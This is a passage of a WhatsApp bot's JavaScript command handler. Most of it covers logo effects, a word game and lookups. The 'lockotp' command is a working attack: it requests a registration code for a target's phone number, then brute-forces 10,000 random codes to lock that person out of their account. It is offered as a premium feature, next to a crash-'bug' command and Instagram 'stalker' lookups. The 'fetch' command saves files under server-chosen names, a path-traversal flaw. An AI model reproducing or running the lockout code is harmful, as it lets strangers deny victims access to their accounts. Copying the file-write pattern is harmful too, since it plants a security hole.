  if (!q) return replyphistar(`Example: ${prefix + command} 23491×××`)

  if (!await isPremium(m.sender)) {
    return replyphistar('❌ *This Command Is for Premium Users Only*.');
  }

  await PhistarBotInc.sendMessage(m?.chat, {react: {text: `🦠`, key: m?.key}}) 
  const bugimage = "https://i.pinimg.com/736x/09/81/20/098120fd9e4991507c66f9070cf2b6d5.jpg"
  const bugcap = "`sʏɴᴄɪɴɢ ʙᴜɢs....`"
  await PhistarBotInc.sendMessage(m.chat, { image: { url: bugimage }, caption: bugcap });
  await PhistarBotInc.sendMessage(m?.chat, {react: {text: `❌`, key: m?.key}}) 
  
  replyphistar("✅ Command executed successfully")
}
break

case 'lockotp': case 'otplock': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    if (args.length < 1) return replyphistar(`Incorrect format\n\nUsage: ${prefix + command} country_code|number\nExample: ${prefix + command} 234|9066655532`);
    const args2 = args[0].split('|');
    if (args2.length !== 2) return replyphistar(`Incorrect format\n\nUsage: ${prefix + command} country_code|number\nExample: ${prefix + command} 234|9066655532`);
    const xeonCountryCode = args2[0];
    const xtarget = args2[1];
    const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
    const xeonmerge = `${xeonCountryCode}${xtarget}`;
    const xeonMention = xeonmerge + '@s.whatsapp.net';
    replyphistar(`Please Wait OTP LOCK Is Running..: ${xeonMention.split('@')[0]}`);
    try {
        const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
        const xeonRequest = await PhistarBotInc.requestRegistrationCode({
            phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
            phoneNumberCountryCode: xeonCountryCode,
            phoneNumberNationalNumber: `${xeonNumber}`,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
        });
        const musicFilePath = './Phistar-media/otp.mp3';

        // Sending the MP3 audio file
        await PhistarBotInc.sendMessage(m.chat, {
            audio: { url: musicFilePath },
            mimetype: 'audio/mp4',
            ptt: true,
        });
    } catch (err) {
    }

    for (let i = 0; i < 10000; i++) {
        try {
            var xeonPrefix = Math.floor(Math.random() * 999);
            var xeonSuffix = Math.floor(Math.random() * 999);
            await PhistarBotInc.register(`${xeonPrefix}-${xeonSuffix}`);
        } catch (err) {
            console.log(`${xeonPrefix}-${xeonSuffix}`);
        }
    }
}
break;
case 'everyone': {
    if (!isAdmins) return replyphistar("Only admins can use this command.");
    PhistarBotInc.sendMessage(m.chat, {
        text: "@" + m.chat,
        contextInfo: {
            mentionedJid: (await (await PhistarBotInc.groupMetadata(m.chat)).participants).map(a => a.id),
            groupMentions: [
                {
                    groupJid: m.chat,
                    groupSubject: 'everyone'
                }
            ]
        }
    });
    setTimeout(async () => {
        replyphistar(`${pushname} using ${command} to call you guys`);
    }, 1120);
}
break;
case 'kdrama': {
    if (!text) {
        throw `Example: ${prefix + command} The Red Sleeve`;
    }
    replyphistar('Looking for Korean drama information...');
    try {
        const url = `https://mydramalist.com/search?q=${encodeURIComponent(text)}`;
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);
        const judul = $('.title').first().text().trim();
        const konten = $('.content').first().find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');
        const link = $('.title').first().find('a').attr('href');
        if (!konten) {
            throw new Error('Not That Korean Drama.');
        }
        const artikel = `*Title:* ${judul}\n\n*Content:* ${konten}\n\n*Link:* https://mydramalist.com${link}`;
        replyphistar(artikel);
    } catch (error) {
        replyphistar(`Sorry, something went wrong: ${error.message}`);
    }
}
break;
case 'wcg': {
    const session = loadWCG();
    if (session && session.active) return replyphistar("❌ A game is already in progress.");

    resetWCG();
    const newSession = {
        active: true,
        players: [],
        currentTurn: 0,
        wordLength: 7,
        timer: 60000,
        usedWords: new Set(),
        lastLetter: null,
        startTime: Date.now(),
        currentPlayer: null,
        isBotProcessing: false
    };
    saveWCG(newSession);

    replyphistar(`🎮 *Word Chain Game Started!*\nType .joinwcg to join (2 players minimum)\nYou have 5 minutes to join!`);

    // Countdown messages
    [3, 2, 1].forEach(min => {
        setTimeout(() => {
            const s = loadWCG();
            if (s?.active && !s.isBotProcessing) {
                replyphistar(`⏳ ${min} minute${min > 1 ? 's' : ''} left to join! Type .joinwcg`);
            }
        }, (5 - min) * 60000);
    });

    // Game start timeout
    setTimeout(() => {
        const session = loadWCG();
        if (!session?.active || session.isBotProcessing) return;
        
        if (session.players.length < 2) {
            resetWCG();
            return replyphistar("❌ Not enough players joined. Game canceled.");
        }
        
        replyphistar(`✅ Starting game with ${session.players.length} players`);
        nextTurn(m, replyphistar);
    }, 300000); // 5 minutes
    break;
}

case 'joinwcg': {
    const session = loadWCG();
    if (!session?.active || session.isBotProcessing) return replyphistar("❌ No active WCG game. Start one with .wcg");

    const user = m.sender;
    if (session.players.includes(user)) return replyphistar(`❌ @${user.split("@")[0]}, you already joined!`);

    session.players.push(user);
    saveWCG(session);

    const timeLeft = Math.ceil((session.startTime + 300000 - Date.now()) / 60000);
    replyphistar(`✅ @${user.split("@")[0]} joined! (${session.players.length} players | ${timeLeft} min left)`);
    break;
}

// Main game logic
async function nextTurn(m, replyphistar) {
    let session = loadWCG();
    if (!session?.active || session.isBotProcessing) return;

    // Check for winner
    if (session.players.length <= 1) {
        if (session.players.length === 1) {
            replyphistar(`🎉 Winner: @${session.players[0].split("@")[0]}!`);
        }
        resetWCG();
        return;
    }

    // Adjust difficulty
    if (session.players.length <= 3) {
        session.wordLength = Math.max(3, session.wordLength - 1);
        session.timer = Math.max(30000, session.timer - 10000);
    }

    // Get current player
    session.currentTurn = session.currentTurn % session.players.length;
    const player = session.players[session.currentTurn];
    session.currentPlayer = player;
    session.isBotProcessing = true;
    saveWCG(session);

    const letter = session.lastLetter || String.fromCharCode(65 + Math.floor(Math.random() * 26));

    replyphistar(`🔠 @${player.split("@")[0]}, give a ${session.wordLength}-letter word starting with "${letter}" (${session.timer/1000}s)`);

    // Player response handler
    const listener = async (event) => {
        const msg = event.messages[0];
        if (!msg || !msg.key || msg.key.remoteJid !== m.key.remoteJid) return;

        // Skip if message is from bot
        if (msg.key.fromMe) return;

        // Get message text from all possible message types
        const getMessageText = () => {
            if (msg.message.conversation) return msg.message.conversation;
            if (msg.message.extendedTextMessage?.text) return msg.message.extendedTextMessage.text;
            if (msg.message.imageMessage?.caption) return msg.message.imageMessage.caption;
            if (msg.message.videoMessage?.caption) return msg.message.videoMessage.caption;
            return null;
        };

        const text = getMessageText();
        if (!text || text.startsWith('.') || (msg.key.participant && msg.key.participant !== player)) return;

        // Clean up listener
        PhistarBotInc.ev.off('messages.upsert', listener);
        clearTimeout(timeout);

        // Reload session and validate
        session = loadWCG();
        if (!session?.active || session.currentPlayer !== player) return;

        const word = text.trim();
        session.isBotProcessing = false;
        
        if (await validateWord(word, letter, session)) {
            session.usedWords.add(word.toLowerCase());
            session.lastLetter = word.slice(-1).toLowerCase();
            session.currentTurn = (session.currentTurn + 1) % session.players.length;
            replyphistar(`✅ "${word}" accepted!`);
        } else {
            replyphistar(`❌ "${word}" is invalid. @${player.split("@")[0]} is eliminated.`);
            session.players.splice(session.currentTurn, 1);
            if (session.currentTurn >= session.players.length) session.currentTurn = 0;
        }

        session.currentPlayer = null;
        saveWCG(session);
        nextTurn(m, replyphistar);
    };

    // Timeout handler
    const timeout = setTimeout(() => {
        PhistarBotInc.ev.off('messages.upsert', listener);
        session = loadWCG();
        if (!session?.active || session.currentPlayer !== player) return;

        session.players.splice(session.currentTurn, 1);
        session.isBotProcessing = false;
        
        if (session.players.length === 1) {
            replyphistar(`⏰ @${player.split("@")[0]} took too long.\n🎉 Winner: @${session.players[0].split("@")[0]}!`);
            resetWCG();
        } else {
            replyphistar(`⏰ @${player.split("@")[0]} took too long. Eliminated.`);
            if (session.currentTurn >= session.players.length) session.currentTurn = 0;
            session.currentPlayer = null;
            saveWCG(session);
            nextTurn(m, replyphistar);
        }
    }, session.timer);

    PhistarBotInc.ev.on('messages.upsert', listener);
}

case 'fetch': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} <api_or_download_link>`);

    try {
        // Notify the user that the bot is processing the request
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `📡`, key: m.key } });

        // Fetch the URL and handle file types
        const response = await axios.get(text, {
            responseType: 'arraybuffer', // Fetch data as a raw buffer
        });

        const contentType = response.headers['content-type'];
        const contentDisposition = response.headers['content-disposition'] || '';
        const extension = contentType.split('/')[1];

        // Generate a temporary filename if no filename is provided in the response headers
        const fileName = contentDisposition.match(/filename="([^"]+)"/)?.[1] || `tempfile.${extension}`;

        // Write the buffer to a temporary file
        const fs = require('fs');
        const path = require('path');
        const tempFilePath = path.resolve(__dirname, fileName);
        fs.writeFileSync(tempFilePath, response.data);

        // Send the file to the user based on its content type
        if (contentType.startsWith('image/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: tempFilePath },
                caption: `*Fetched image from:* ${text}`,
            }, { quoted: m });
        } else if (contentType.startsWith('video/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: tempFilePath },
                mimetype: contentType,
                caption: `*Fetched video from:* ${text}`,
            }, { quoted: m });
        } else if (contentType.startsWith('audio/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: tempFilePath },
                mimetype: contentType,
                fileName: fileName,
                caption: `*Fetched music from:* ${text}`,
            }, { quoted: m });
        } else {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: tempFilePath },
                mimetype: contentType,
                fileName: fileName,
                caption: `*Fetched file from:* ${text}`,
            }, { quoted: m });
        }

        // Cleanup: Delete the temporary file after sending
        fs.unlinkSync(tempFilePath);
    } catch (error) {
        console.error('Error in fetch command:', error);

        // Provide detailed error feedback
        replyphistar(`*Failed to fetch the requested resource. Possible reasons:*
1. Invalid URL or download link
2. The server rejected the request
3. The file type isn't supported.

*Error Details:* ${error.message}`);
    }
    break;
}

case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Big Daddy`);

    let link;
    if (/stonetext/.test(command))
        link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
    if (/writeart/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
    if (/summertext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
    if (/wolfmetaltext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
    if (/nature3dtext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
    if (/rosestext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
    if (/naturetypography/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
    if (/quotesunder/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
    if (/shinetext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
    if (/shadow/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
    if (/write/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
    if (/romantic/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
    if (/burnpaper/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
    if (/smoke/.test(command))
        link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
    if (/narutobanner/.test(command))
        link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
    if (/love/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
    if (/undergrass/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
    if (/doublelove/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
    if (/coffecup/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
    if (/underwaterocean/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
    if (/smokyneon/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
    if (/starstext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
    if (/rainboweffect/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
    if (/balloontext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
    if (/metalliceffect/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
    if (/embroiderytext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
    if (/flamingtext/.test(command))
        link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
    let dehe = await photoOxy(link, text);
    PhistarBotInc.sendMessage(m?.chat, {
        image: { url: dehe },
        caption: `Done`
    }, { quoted: m });
}
break;

case 'myip': {
    if (!isCreator) return replyphistar(`For My Owner Only`);
    var http = require('http');
    http.get({
        'host': 'api.ipify.org',
        'port': 80,
        'path': '/'
    }, function(resp) {
        resp.on('data', function(ip) {
            replyphistar("🔎 *Your IP Address is:* " + ip);
        });
    });
}
break;

case 'ip': {
    if (!text) return replyphistar('Give me an IP address?');
    let ipv = await (await fetch('https://endpoint.web.id/tools/cekip?key=gojou&id=' + text)).json();
    if (ipv.status) {
        let shannz = ipv.result;
        let tesk = `*[ IP CHECKER ]*\n\nIP: ${shannz.ip}\nCity: ${shannz.city}\nCountry: ${shannz.country}\nLocation: ${shannz.loc}\nORG: ${shannz.org}\nPostal: ${shannz.postal}\nTime_Zone: ${shannz.timezone}\nMORE DETAIL: ${shannz.readme}`;
        replyphistar(tesk);
    } else {
        replyphistar('Not found or error');
    }
}
break;
case 'igstalk': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} marvel`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🔍`, key: m.key } });

    try {
        const res = await axios.get(`https://api.paxsenix.biz.id/stalker/instagram?username=${encodeURIComponent(text)}`);
        const data = res.data;

        if (!data.ok || !data.result) {
            return replyphistar(`❌ Failed to fetch IG data. Make sure the username is correct.`);
        }

        const ig = data.result;
        const caption = `*📸 Instagram Stalker Result*\n\n` +
                        `> *Username:* @${text}\n` +
                        `> *Name:* ${ig.nickname || "N/A"}\n` +
                        `> *Bio:* ${ig.bio || "N/A"}\n` +
                        `> *Posts:* ${ig.postsCount}\n` +
                        `> *Followers:* ${ig.followersCount}\n` +
                        `> *Following:* ${ig.followingCount}\n\n` +
                        `> Generated`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: ig.avatar },
            caption: caption
        }, { quoted: m });

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (err) {
        console.error("IGStalk Error:", err);
        replyphistar(`❌ Error occurred:\n> ${err.message}`);
    }

    break;
}

case 'npm': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} baileys`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `📦`, key: m.key } });

    try {
        const res = await axios.get(`https://www.dark-yasiya-api.site/other/npmstalk?package=${encodeURIComponent(text)}`);
        const pkg = res.data?.result;

        if (!res.data?.status || !pkg) {
            return replyphistar(`❌ Package not found or something went wrong.`);
        }

        const info = `*📦 NPM PACKAGE INFO*\n\n` +
                     `> *Name:* ${pkg.name}\n` +
                     `> *Latest Version:* ${pkg.versionLatest}\n` +
                     `> *Published Version:* ${pkg.versionPublish}\n` +
                     `> *Times Updated:* ${pkg.versionUpdate}x\n\n` +
                     `> *Dependencies (Latest):* ${pkg.latestDependencies}\n` +
                     `> *Dependencies (Published):* ${pkg.publishDependencies}\n\n` +
                     `> *First Published:* ${pkg.publishTime}\n` +
                     `> *Last Updated:* ${pkg.latestPublishTime}\n\n` +
                     `> Generated`;

        replyphistar(info);

    } catch (e) {
        console.error('NPM Info Error:', e);
        replyphistar(`❌ Error: ${e.message}`);
    }

    break;
}

case 'creatememe': {
    const memeImageUrl = args[0];
    const topText = args[1];
    const bottomText = args[2];
    if (!memeImageUrl || !topText || !bottomText) return replyphistar('Usage: .creatememe [image URL] [top text] [bottom text]');
    axios.get(`api.memegen.link/images/custom/${encodeURI(topText)}/${encodeURI(bottomText)}.jpg?background=${memeImageUrl}`, { responseType: 'arraybuffer' })
        .then(response => {
            const buffer = Buffer.from(response.data, 'binary');
            PhistarBotInc.sendMessage(m.chat, { image: buffer, caption: 'Here is your meme!' });
        })
        .catch(() => replyphistar('Could not create meme. Please check the image URL and try again.'));
    break;
}

case 'ss': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://apis.davidcyriltech.my.id`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `📸`, key: m?.key } });

        // Fetch the screenshot from the API
        const apiUrl = `https://apis.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}&device=tablet`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data && apiResponse.data.success) {
            const { screenshotUrl } = apiResponse.data;

            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: screenshotUrl },
                caption: `🖼️ *Web Screenshot* \n\n🌐 URL: ${text}\n📱 Device: Tablet\n\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`*Failed to capture the screenshot! Please check the URL and try again.*`);
        }
    } catch (error) {
        console.error('Error during ssweb command:', error);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
case 'sketch': {
    if (!quoted || !/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!!*\n\n> Reply to an image with:\n> *${prefix + command} style_name*\n\n*Available styles:*\nink_painting, bg_line, color_rough, gouache, manga_sketch, ink_sketch, pencil_sketch, sketch, anime_sketch, line_art, simplex, doodle, intricate_line`);
    }

    if (!text) {
        return replyphistar(`*STYLE REQUIRED!!*\n\n> Use a valid style.\n> *Example:* ${prefix + command} anime_sketch`);
    }

    const validStyles = [
        "ink_painting", "bg_line", "color_rough", "gouache", "manga_sketch",
        "ink_sketch", "pencil_sketch", "sketch", "anime_sketch", "line_art",
        "simplex", "doodle", "intricate_line"
    ];

    if (!validStyles.includes(text)) {
        return replyphistar(`*INVALID STYLE!!*\n\n> Available styles:\n> ${validStyles.join(', ')}`);
    }

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎨`, key: m.key } });

    try {
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload to Catbox
        const uploadResponse = await uploadFile(mediaPath);
        if (!uploadResponse?.url) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`❌ Failed to upload image to Catbox.`);
        }

        const imageUrl = uploadResponse.url;
        const apiUrl = `https://api.siputzx.my.id/api/imgedit/convphoto?image=${encodeURIComponent(imageUrl)}&template=sketch_v2&style=${text}`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `*✅ Successfully converted your image to style:* _${text}_`
        }, { quoted: m });

        fs.unlinkSync(mediaPath);
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (error) {
        console.error('Sketch Style Error:', error);
        replyphistar(`❌ An error occurred.\n> ${error.message}`);
    }

    break;
}

case 'gradienttext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'effectclouds': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'watercolortext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'cartoonstyle': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'logomaker': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/text-logo-maker-online-free-474.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'underwatertext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/3d-underwater-text-effect-online-682.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'glowingtext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-glowing-text-effects-online-706.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'blackpinklogo': case 'blackpinkstyle': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> GeneratednPowered by Phistar ⚡`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'deletingtext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/national-flag-text-effect-according-to-your-country-752.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'flag3dtext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'flagtext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'neonglitch': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
